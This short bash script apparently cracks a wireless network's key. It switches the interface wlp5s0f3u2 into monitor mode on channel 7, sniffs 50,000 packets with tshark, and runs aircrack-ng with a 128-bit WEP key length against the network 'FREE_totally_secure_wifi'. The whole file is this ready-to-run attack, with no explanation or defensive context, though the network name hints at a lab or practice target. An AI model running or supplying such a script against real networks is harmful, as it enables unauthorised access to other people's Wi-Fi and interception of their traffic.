#!/bin/bash

set -e

ip link set up wlp5s0f3u2
iwconfig wlp5s0f3u2 mode monitor
sudo iwconfig wlp5s0f3u2 channel 7

tshark -i wlp5s0f3u2 -c 50000 -w /tmp/dump.pcap -F pcap
aircrack-ng -n 128 -e FREE_totally_secure_wifi /tmp/dump.pcap